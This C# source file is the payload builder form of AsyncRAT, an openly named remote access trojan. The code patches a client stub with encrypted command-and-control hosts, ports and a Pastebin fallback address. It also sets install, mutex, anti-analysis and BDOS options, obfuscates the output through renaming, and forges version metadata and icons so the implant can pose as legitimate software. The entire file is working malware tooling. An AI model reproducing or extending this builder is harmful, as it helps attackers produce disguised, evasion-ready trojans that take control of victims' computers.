using System;
using System.Windows.Forms;
using Mono.Cecil;
using AsyncRAT_Sharp.Helper;
using Mono.Cecil.Cil;
using System.Text;
using System.Security.Cryptography;
using AsyncRAT_Sharp.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Collections.Generic;
using Vestris.ResourceLib;
using System.Drawing;

namespace AsyncRAT_Sharp.Forms
{
    public partial class FormBuilder : Form
    {
        public FormBuilder()
        {
            InitializeComponent();
        }

        private void SaveSettings()
        {
            try
            {
                List<string> Pstring = new List<string>();
                foreach (string port in listBoxPort.Items)
                {
                    Pstring.Add(port);
                }
                Properties.Settings.Default.Ports = string.Join(",", Pstring);

                List<string> IPstring = new List<string>();
                foreach (string ip in listBoxIP.Items)
                {
                    IPstring.Add(ip);
                }
                Properties.Settings.Default.IP = string.Join(",", IPstring);

                Properties.Settings.Default.Save();
            }
            catch { }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                checkBox1.Text = "ON";
                textFilename.Enabled = true;
                comboBoxFolder.Enabled = true;
            }
            else
            {
                checkBox1.Text = "OFF";
                textFilename.Enabled = false;
                comboBoxFolder.Enabled = false;
            }
        }

        private void Builder_Load(object sender, EventArgs e)
        {
            comboBoxFolder.SelectedIndex = 0;
            if (Properties.Settings.Default.IP.Length == 0)
                listBoxIP.Items.AddRange(new object[] { "127.0.0.1", "0.0.0.0" });

            if (Properties.Settings.Default.Pastebin.Length == 0)
                txtPastebin.Text = "https://pastebin.com/raw/s14cUU5G";

            try
            {
                string[] ports = Properties.Settings.Default.Ports.Split(new[] { "," }, StringSplitOptions.None);
                foreach (string item in ports)
                {
                    if (!string.IsNullOrWhiteSpace(item))
                        listBoxPort.Items.Add(item.Trim());
                }
            }
            catch { }

            try
            {
                string[] ip = Properties.Settings.Default.IP.Split(new[] { "," }, StringSplitOptions.None);
                foreach (string item in ip)
                {
                    if (!string.IsNullOrWhiteSpace(item))
                        listBoxIP.Items.Add(item.Trim());
                }
            }
            catch { }
        }

        private void WriteSettings(AssemblyDefinition asmDef)
        {
            var key = Methods.GetRandomString(32);
            var aes = new Aes256(key);
            var caCertificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
            var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert));
            byte[] signature;
            using (var csp = (RSACryptoServiceProvider)caCertificate.PrivateKey)
            {
                var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
                signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
            }

            foreach (var typeDef in asmDef.Modules[0].Types)
            {
                if (typeDef.FullName == "Client.Settings")
                {
                    foreach (var methodDef in typeDef.Methods)
                    {
                        if (methodDef.Name == ".cctor")
                        {
                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                            {
                                if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    string operand = methodDef.Body.Instructions[i].Operand.ToString();

                                    if (operand == "%Ports%")
                                    {
                                        if (chkPastebin.Enabled && chkPastebin.Checked)
                                        {
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
                                        }
                                        else
                                        {
                                            List<string> LString = new List<string>();
                                            foreach (string port in listBoxPort.Items)
                                            {
                                                LString.Add(port);
                                            }
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", LString));
                                        }
                                    }

                                    if (operand == "%Hosts%")
                                    {
                                        if (chkPastebin.Enabled && chkPastebin.Checked)
                                        {
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
                                        }
                                        else
                                        {
                                            List<string> LString = new List<string>();
                                            foreach (string ip in listBoxIP.Items)
                                            {
                                                LString.Add(ip);
                                            }
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", LString));
                                        }
                                    }

                                    if (operand == "%Install%")
                                        methodDef.Body.Instructions[i].Operand = checkBox1.Checked.ToString().ToLower();

                                    if (operand == "%Folder%")
                                        methodDef.Body.Instructions[i].Operand = comboBoxFolder.Text;

                                    if (operand == "%File%")
                                        methodDef.Body.Instructions[i].Operand = textFilename.Text;

                                    if (operand == "%Key%")
                                        methodDef.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(key));

                                    if (operand == "%MTX%")
                                        methodDef.Body.Instructions[i].Operand = txtMutex.Text;

                                    if (operand == "%Anti%")
                                        methodDef.Body.Instructions[i].Operand = chkAnti.Checked.ToString().ToLower();

                                    if (operand == "%Certificate%")
                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));

                                    if (operand == "%Serversignature%")
                                        methodDef.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));

                                    if (operand == "%BDOS%")
                                        methodDef.Body.Instructions[i].Operand = chkBdos.Checked.ToString().ToLower();

                                    if (operand == "%Pastebin%")
                                        if (chkPastebin.Checked)
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt(txtPastebin.Text);
                                        else
                                            methodDef.Body.Instructions[i].Operand = aes.Encrypt("null");
                                }
                            }
                        }
                    }
                }
            }
        }

        private void CheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (chkPastebin.Checked)
            {
                txtPastebin.Enabled = true;
                textIP.Enabled = false;
                textPort.Enabled = false;
                listBoxIP.Enabled = false;
                listBoxPort.Enabled = false;
                btnAddIP.Enabled = false;
                btnAddPort.Enabled = false;
                btnRemoveIP.Enabled = false;
                btnRemovePort.Enabled = false;
            }
            else
            {
                txtPastebin.Enabled = false;
                textIP.Enabled = true;
                textPort.Enabled = true;
                listBoxIP.Enabled = true;
                listBoxPort.Enabled = true;
                btnAddIP.Enabled = true;
                btnAddPort.Enabled = true;
                btnRemoveIP.Enabled = true;
                btnRemovePort.Enabled = true;
            }
        }

        private void BtnRemovePort_Click(object sender, EventArgs e)
        {
            if (listBoxPort.SelectedItems.Count == 1)
            {
                listBoxPort.Items.Remove(listBoxPort.SelectedItem);
            }
        }

        private void BtnAddPort_Click(object sender, EventArgs e)
        {
            try
            {
                Convert.ToInt16(textPort.Text.Trim());
                foreach (string item in listBoxPort.Items)
                {
                    if (item.Equals(textPort.Text.Trim()))
                        return;
                }
                listBoxPort.Items.Add(textPort.Text.Trim());
                textPort.Clear();
            }
            catch { }
        }

        private void BtnRemoveIP_Click(object sender, EventArgs e)
        {
            if (listBoxIP.SelectedItems.Count == 1)
            {
                listBoxIP.Items.Remove(listBoxIP.SelectedItem);
            }
        }

        private void BtnAddIP_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (string item in listBoxIP.Items)
                {
                    textIP.Text = textIP.Text.Replace(" ", "");
                    if (item.Equals(textIP.Text))
                        return;
                }
                listBoxIP.Items.Add(textIP.Text.Replace(" ", ""));
                textIP.Clear();
            }
            catch { }
        }

        private void BtnBuild_Click(object sender, EventArgs e)
        {
            if (listBoxIP.Items.Count == 0 || listBoxPort.Items.Count == 0) return;

            if (checkBox1.Checked)
            {
                if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
                if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
            }

            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = Guid.NewGuid().ToString().Substring(20);

            if (chkPastebin.Checked && string.IsNullOrWhiteSpace(txtPastebin.Text)) return;

            try
            {
                using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(@"Stub/Stub.exe"))
                {
                    WriteSettings(asmDef);

                    Renamer r = new Renamer(asmDef);

                    if (!r.Perform())
                        throw new Exception("renaming failed");

                    using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                    {
                        saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                        saveFileDialog1.InitialDirectory = Application.StartupPath;
                        saveFileDialog1.OverwritePrompt = false;
                        saveFileDialog1.FileName = "Client";
                        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                        {
                            r.AsmDef.Write(saveFileDialog1.FileName);
                            r.AsmDef.Dispose();
                            if (btnAssembly.Checked)
                            {
                                WriteAssembly(saveFileDialog1.FileName);
                            }
                            if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
                            {
                                IconInjector.InjectIcon(saveFileDialog1.FileName, txtIcon.Text);
                            }
                            MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            SaveSettings();
                            this.Close();
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void WriteAssembly(string filename)
        {
            try
            {
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(filename);

                versionResource.FileVersion = txtFileVersion.Text;
                versionResource.ProductVersion = txtProductVersion.Text;
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["ProductName"] = txtProduct.Text;
                stringFileInfo["FileDescription"] = txtDescription.Text;
                stringFileInfo["CompanyName"] = txtCompany.Text;
                stringFileInfo["LegalCopyright"] = txtCopyright.Text;
                stringFileInfo["LegalTrademarks"] = txtTrademarks.Text;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = txtOriginalFilename.Text;
                stringFileInfo["OriginalFilename"] = txtOriginalFilename.Text;
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;

                versionResource.SaveTo(filename);
            }
            catch (Exception ex)
            {
                throw new ArgumentException("Assembly: " + ex.Message);
            }
        }

        private void BtnAssembly_CheckedChanged(object sender, EventArgs e)
        {
            if (btnAssembly.Checked)
            {
                txtProduct.Enabled = true;
                txtDescription.Enabled = true;
                txtCompany.Enabled = true;
                txtCopyright.Enabled = true;
                txtTrademarks.Enabled = true;
                txtOriginalFilename.Enabled = true;
                txtOriginalFilename.Enabled = true;
                txtProductVersion.Enabled = true;
                txtFileVersion.Enabled = true;
            }
            else
            {
                txtProduct.Enabled = false;
                txtDescription.Enabled = false;
                txtCompany.Enabled = false;
                txtCopyright.Enabled = false;
                txtTrademarks.Enabled = false;
                txtOriginalFilename.Enabled = false;
                txtOriginalFilename.Enabled = false;
                txtProductVersion.Enabled = false;
                txtFileVersion.Enabled = false;
            }
        }

        private void ChkIcon_CheckedChanged(object sender, EventArgs e)
        {
            if (chkIcon.Checked)
            {
                txtIcon.Enabled = true;
                btnIcon.Enabled = true;
            }
            else
            {
                txtIcon.Enabled = false;
                btnIcon.Enabled = false;
            }
        }

        private void BtnIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Choose Icon";
                ofd.Filter = "Icons *.ico|*.ico";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtIcon.Text = ofd.FileName;
                    picIcon.ImageLocation = ofd.FileName;
                }
            }
        }
    }
}